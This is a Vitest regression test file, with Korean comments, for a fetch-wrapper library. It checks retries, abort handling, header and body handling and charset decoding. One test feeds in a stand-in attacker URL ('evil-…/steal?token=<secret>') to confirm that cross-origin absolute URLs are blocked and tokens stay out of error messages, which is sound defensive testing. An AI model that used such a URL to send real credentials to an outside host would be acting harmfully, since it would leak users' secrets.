/**
 * @file issue-fixes.test.ts
 * @description 사용성 이슈 점검에서 발견된 결함에 대한 회귀 테스트입니다.
 * 1) 재시도 체인에서 재시도가 중복되고 onError가 여러 번 호출되던 문제
 * 2) afterResponse 예외가 재시도를 유발하던 문제
 * 3) 소문자 method('patch')가 그대로 전송되던 문제
 * 4) POST/PATCH가 기본 retry로 재전송되던 문제
 * 5) 기본 JSON Content-Type이 URLSearchParams/Blob 본문에 남던 문제
 * 6) 재시도 대기 중 사용자 abort가 반영되지 않던 문제
 * 7) 재시도로 버려지는 응답 본문이 해제되지 않던 문제
 * 8) 비 UTF-8 charset 응답이 깨지던 문제
 * 9) AbortSignal.any 폴백 경로에서 본문 수신 중 사용자 abort가 전달되지 않던 문제
 * 10) afterResponse에 전달된 clone을 읽지 않으면 tee 버퍼가 해제되지 않던 문제
 * 11) AbortSignal.any 폴백 경로에서 사용자 signal의 abort reason(TimeoutError 등)이 사라지던 문제
 * 12) Content-Length 없는 빈 본문이 null 대신 빈 문자열로 파싱되던 문제
 * @vitest-environment node
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { appFetch, getData } from '../src';

const randomInt = (min: number, max: number): number =>
  min + Math.floor(Math.random() * (max - min + 1));
const randomId = (): string => crypto.randomUUID().slice(0, 8);
const pick = <T>(items: readonly T[]): T => items[randomInt(0, items.length - 1)];

const jsonResponse = (status: number, data: unknown = { id: randomId() }) =>
  new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json' },
  });

describe('Issue Fixes Regression', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  it('재시도 중 마지막 시도가 실패해도 총 시도 횟수는 retry + 1이고 onError는 1회만 호출된다', async () => {
    const retry = randomInt(1, 3);
    let calls = 0;
    vi.spyOn(globalThis, 'fetch').mockImplementation(async () => {
      calls++;
      if (calls === 1) {
        return jsonResponse(pick([500, 502, 503, 504]));
      }
      throw new TypeError(`network down ${randomId()}`);
    });
    const onError = vi.fn();

    await expect(
      appFetch(`/api/${randomId()}`, { retry, delay: 0, onError }),
    ).rejects.toThrow('network down');

    expect(calls).toBe(retry + 1);
    expect(onError).toHaveBeenCalledTimes(1);
  });

  it('afterResponse 예외는 재시도하지 않고 onError 1회 후 그대로 던진다', async () => {
    const fetchSpy = vi
      .spyOn(globalThis, 'fetch')
      .mockImplementation(async () => jsonResponse(200));
    const message = `after failed ${randomId()}`;
    const onError = vi.fn();

    await expect(
      appFetch('/api/after', {
        retry: randomInt(1, 5),
        delay: 0,
        onError,
        afterResponse: () => {
          throw new Error(message);
        },
      }),
    ).rejects.toThrow(message);

    expect(fetchSpy).toHaveBeenCalledTimes(1);
    expect(onError).toHaveBeenCalledTimes(1);
  });

  it('소문자로 지정한 method는 대문자로 전송된다', async () => {
    let sent: string | undefined;
    vi.spyOn(globalThis, 'fetch').mockImplementation(async (_input, init) => {
      sent = init?.method;
      return jsonResponse(200);
    });

    const bodyMethod = pick(['post', 'put', 'patch', 'delete'] as const);
    await appFetch('/api/body', { method: bodyMethod, body: { v: randomId() } });
    expect(sent).toBe(bodyMethod.toUpperCase());

    const noBodyMethod = pick(['get', 'delete', 'head', 'options'] as const);
    await appFetch('/api/nobody', { method: noBodyMethod });
    expect(sent).toBe(noBodyMethod.toUpperCase());
  });

  it('POST/PATCH는 기본 retry로 재전송되지 않고, retryStrategy를 지정하면 재시도된다', async () => {
    const method = pick(['post', 'patch'] as const);
    const status = pick([408, 429, 500, 503]);
    const fetchSpy = vi
      .spyOn(globalThis, 'fetch')
      .mockImplementation(async () => jsonResponse(status));

    const res = await appFetch('/api/pay', {
      method,
      body: { amount: randomInt(1, 9999) },
      retry: randomInt(1, 3),
      delay: 0,
    });
    expect(res.status).toBe(status);
    expect(fetchSpy).toHaveBeenCalledTimes(1);

    fetchSpy.mockClear();
    const maxRetries = randomInt(1, 3);
    await appFetch('/api/pay', {
      method,
      body: { amount: randomInt(1, 9999) },
      retryStrategy: ({ attempt }) => ({ shouldRetry: attempt <= maxRetries }),
    });
    expect(fetchSpy).toHaveBeenCalledTimes(maxRetries + 1);
  });

  it('기본 JSON Content-Type은 URLSearchParams/Blob 본문에서 제거되고 문자열 본문에서는 유지된다', async () => {
    let headers: Headers | undefined;
    vi.spyOn(globalThis, 'fetch').mockImplementation(async (_input, init) => {
      headers = init?.headers as Headers;
      return jsonResponse(200);
    });
    const client = appFetch.create({
      baseURL: `https://${randomId()}.example.com`,
      headers: { 'Content-Type': 'application/json' },
    });

    await client('/form', {
      method: 'post',
      body: new URLSearchParams({ q: randomId() }),
    });
    expect(headers?.has('Content-Type')).toBe(false);

    await client('/blob', {
      method: 'put',
      body: new Blob([randomId()], { type: 'text/plain' }),
    });
    expect(headers?.has('Content-Type')).toBe(false);

    await client('/raw', {
      method: 'post',
      body: JSON.stringify({ v: randomId() }),
    });
    expect(headers?.get('Content-Type')).toBe('application/json');
  });

  it('재시도 대기 중 사용자 signal이 abort되면 대기 없이 즉시 중단되고 onError는 1회 호출된다', async () => {
    const controller = new AbortController();
    vi.spyOn(globalThis, 'fetch').mockImplementation(async (_input, init) => {
      if (init?.signal?.aborted) {
        throw new DOMException('aborted', 'AbortError');
      }
      return jsonResponse(503);
    });
    const onError = vi.fn();
    const startedAt = Date.now();

    const pending = appFetch('/api/slow', {
      retry: 3,
      delay: 60_000,
      signal: controller.signal,
      onError,
    });
    setTimeout(() => controller.abort(), randomInt(5, 30));

    await expect(pending).rejects.toThrow();
    expect(Date.now() - startedAt).toBeLessThan(5_000);
    expect(onError).toHaveBeenCalledTimes(1);
  });

  it('재시도로 버려지는 응답의 본문은 해제된다', async () => {
    const responses: Response[] = [];
    vi.spyOn(globalThis, 'fetch').mockImplementation(async () => {
      const res =
        responses.length === 0 ? jsonResponse(503) : jsonResponse(200);
      responses.push(res);
      return res;
    });

    const res = await appFetch('/api/retry', { retry: 1, delay: 0 });
    expect(res.status).toBe(200);
    expect(responses).toHaveLength(2);
    await vi.waitFor(() => expect(responses[0].bodyUsed).toBe(true));
  });

  it('2xx 성공 응답에는 retryStrategy를 호출하지 않는다', async () => {
    const status = pick([200, 201, 204]);
    const fetchSpy = vi
      .spyOn(globalThis, 'fetch')
      .mockImplementation(async () =>
        status === 204 ? new Response(null, { status }) : jsonResponse(status),
      );
    const shouldRetry = vi.fn(() => true);

    const res = await appFetch(`/api/${randomId()}`, {
      retryStrategy: { shouldRetry, getDelay: () => 0 },
    });

    expect(res.status).toBe(status);
    expect(fetchSpy).toHaveBeenCalledTimes(1);
    expect(shouldRetry).not.toHaveBeenCalled();
  });

  it('fetch 이전 단계의 결정적 에러(순환 쿼리, beforeRequest 예외)는 재시도하지 않는다', async () => {
    const fetchSpy = vi
      .spyOn(globalThis, 'fetch')
      .mockImplementation(async () => jsonResponse(200));
    const onError = vi.fn();
    const query: Record<string, unknown> = { id: randomId() };
    query.self = query;

    await expect(
      appFetch('/api/q', { query, retry: randomInt(1, 5), delay: 0, onError }),
    ).rejects.toThrow('Circular reference detected in query parameters');
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(onError).toHaveBeenCalledTimes(1);

    const message = `not logged in ${randomId()}`;
    const beforeRequest = vi.fn(() => {
      throw new Error(message);
    });
    await expect(
      appFetch('/api/b', { retry: randomInt(1, 5), delay: 0, beforeRequest }),
    ).rejects.toThrow(message);
    expect(beforeRequest).toHaveBeenCalledTimes(1);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('타임아웃 에러는 name이 TimeoutError이고 재시도 대상에 포함된다', async () => {
    const fetchSpy = vi
      .spyOn(globalThis, 'fetch')
      .mockImplementation(
        (_input, init) =>
          new Promise<Response>((_, reject) => {
            init?.signal?.addEventListener('abort', () =>
              reject(new DOMException('aborted', 'AbortError')),
            );
          }),
      );
    const retry = randomInt(1, 2);

    const error: unknown = await appFetch('/api/hang', {
      timeout: randomInt(10, 30),
      retry,
      delay: 0,
    }).catch((e: unknown) => e);

    expect(error).toBeInstanceOf(Error);
    expect((error as Error).name).toBe('TimeoutError');
    expect((error as Error).message).toMatch(/Request Timeout/);
    expect(fetchSpy).toHaveBeenCalledTimes(retry + 1);
  });

  it('baseURL과 origin이 다른 절대 URL은 fetch 전에 차단되고 토큰이 에러 메시지에 노출되지 않는다', async () => {
    const fetchSpy = vi
      .spyOn(globalThis, 'fetch')
      .mockImplementation(async () => jsonResponse(200));
    const onError = vi.fn();
    const secret = randomId();
    const client = appFetch.create({
      baseURL: `https://api-${randomId()}.example.com/v1`,
      headers: { Authorization: `Bearer ${secret}` },
      retry: randomInt(1, 3),
      onError,
    });
    const evil = `${pick(['http', 'https'])}://evil-${randomId()}.test`;

    const error: unknown = await client(`${evil}/steal?token=${secret}`).catch(
      (e: unknown) => e,
    );

    expect((error as Error).message).toContain(evil);
    expect((error as Error).message).not.toContain(secret);
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(onError).toHaveBeenCalledTimes(1);
  });

  it('같은 origin 절대 URL, allowAbsoluteUrls, baseURL 미지정, blob:/data: 는 허용된다', async () => {
    const urls: string[] = [];
    vi.spyOn(globalThis, 'fetch').mockImplementation(async (input) => {
      urls.push(String(input));
      return jsonResponse(200);
    });
    const origin = `https://api-${randomId()}.example.com`;
    const external = `https://ext-${randomId()}.test/data`;
    const client = appFetch.create({ baseURL: `${origin}/v1` });

    await client(`${origin}/v1/items?page=${randomInt(2, 9)}`);
    await client(external, { allowAbsoluteUrls: true });
    await appFetch.create({ baseURL: origin, allowAbsoluteUrls: true })(external);
    await appFetch(external);
    await client(`data:text/plain,${randomId()}`);

    expect(urls).toHaveLength(5);
    expect(urls[1]).toBe(external);
  });

  it('dispatcher 옵션(사내 프록시용)은 인스턴스 기본값과 호출값 모두 네이티브 fetch에 전달된다', async () => {
    const inits: RequestInit[] = [];
    vi.spyOn(globalThis, 'fetch').mockImplementation(async (_input, init) => {
      inits.push(init ?? {});
      return jsonResponse(200);
    });
    const instanceDispatcher = { id: randomId() };
    const callDispatcher = { id: randomId() };
    const client = appFetch.create({
      baseURL: `https://api-${randomId()}.example.com`,
      dispatcher: instanceDispatcher,
    });

    await client('/a');
    await client('/b', { dispatcher: callDispatcher });

    const dispatchers = inits.map(
      (init) => (init as RequestInit & { dispatcher?: unknown }).dispatcher,
    );
    expect(dispatchers).toEqual([instanceDispatcher, callDispatcher]);
  });

  it('charset=euc-kr 텍스트 응답을 올바르게 디코딩한다', async () => {
    const suffix = randomId();
    // '한글'의 EUC-KR 바이트 + 임의 ASCII 접미사
    const bytes = new Uint8Array([
      0xc7,
      0xd1,
      0xb1,
      0xdb,
      ...new TextEncoder().encode(suffix),
    ]);
    const response = new Response(bytes, {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=EUC-KR' },
    });

    expect(await getData(response)).toBe(`한글${suffix}`);
  });

  it.each(['native', 'fallback'] as const)(
    '[%s] 헤더 수신 후 본문이 멈추면 사용자 signal abort로 getData()가 중단된다',
    async (mode) => {
      const anyRef = AbortSignal.any;
      if (mode === 'fallback') {
        Reflect.deleteProperty(AbortSignal, 'any');
      }

      try {
        // 실제 런타임처럼 fetch에 전달된 signal이 abort되면 본문 스트림을 에러로 끝냅니다.
        vi.spyOn(globalThis, 'fetch').mockImplementation(async (_input, init) => {
          const body = new ReadableStream<Uint8Array>({
            start(controller) {
              controller.enqueue(new TextEncoder().encode(`{"id":"${randomId()}",`));
              init?.signal?.addEventListener('abort', () =>
                controller.error(new DOMException('aborted', 'AbortError')),
              );
            },
          });
          return new Response(body, {
            status: 200,
            headers: { 'Content-Type': 'application/json' },
          });
        });

        const controller = new AbortController();
        const response = await appFetch(`/stall-${randomId()}`, {
          timeout: randomInt(2000, 4000),
          signal: controller.signal,
        });
        setTimeout(() => controller.abort(), randomInt(5, 30));

        await expect(response.getData()).rejects.toMatchObject({
          name: 'AbortError',
        });
      } finally {
        Object.defineProperty(AbortSignal, 'any', {
          value: anyRef,
          configurable: true,
          writable: true,
        });
      }
    },
  );

  it('afterResponse가 읽지 않은 clone은 해제되고, 읽기를 시작한 clone과 원본 파싱은 영향받지 않는다', async () => {
    const payload = { id: randomId(), items: [randomId(), randomId()] };
    vi.spyOn(globalThis, 'fetch').mockImplementation(async () =>
      jsonResponse(200, payload),
    );

    let unread: Response | undefined;
    let firedText: Promise<string> | undefined;
    const response = await appFetch(`/clone-${randomId()}`, {
      afterResponse: [
        (res) => {
          unread = res;
        },
        (res) => {
          // await 없이 읽기만 시작하는 로깅 패턴
          firedText = res.text();
        },
      ],
    });

    expect(unread?.bodyUsed).toBe(true);
    expect(JSON.parse(await (firedText ?? Promise.resolve('null')))).toEqual(payload);
    expect(await response.getData()).toEqual(payload);
  });

  it.each(['native', 'fallback'] as const)(
    '[%s] 사용자 signal의 abort reason이 그대로 전달된다 (AbortSignal.timeout → TimeoutError)',
    async (mode) => {
      const anyRef = AbortSignal.any;
      if (mode === 'fallback') {
        Reflect.deleteProperty(AbortSignal, 'any');
      }

      try {
        // 실제 런타임처럼 signal이 abort되면 signal.reason으로 reject합니다.
        vi.spyOn(globalThis, 'fetch').mockImplementation(
          (_input, init) =>
            new Promise<Response>((_resolve, reject) => {
              init?.signal?.addEventListener('abort', () =>
                reject(init.signal?.reason),
              );
            }),
        );

        const controller = new AbortController();
        const reason = new DOMException(`t-${randomId()}`, 'TimeoutError');
        setTimeout(() => controller.abort(reason), randomInt(5, 30));

        await expect(
          appFetch(`/reason-${randomId()}`, {
            timeout: randomInt(2000, 4000),
            signal: controller.signal,
          }),
        ).rejects.toBe(reason);
      } finally {
        Object.defineProperty(AbortSignal, 'any', {
          value: anyRef,
          configurable: true,
          writable: true,
        });
      }
    },
  );

  it('Content-Length 없는 빈 본문은 상태 코드·Content-Type과 무관하게 null이다', async () => {
    const status = pick([200, 201, 202]);
    const contentType = pick(['application/json', 'text/plain', `application/vnd.${randomId()}+json`]);
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    const body = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.close();
      },
    });
    const response = new Response(body, {
      status,
      headers: { 'Content-Type': contentType },
    });

    expect(response.headers.get('content-length')).toBeNull();
    expect(await getData(response)).toBeNull();
    expect(errorSpy).not.toHaveBeenCalled();
  });
});
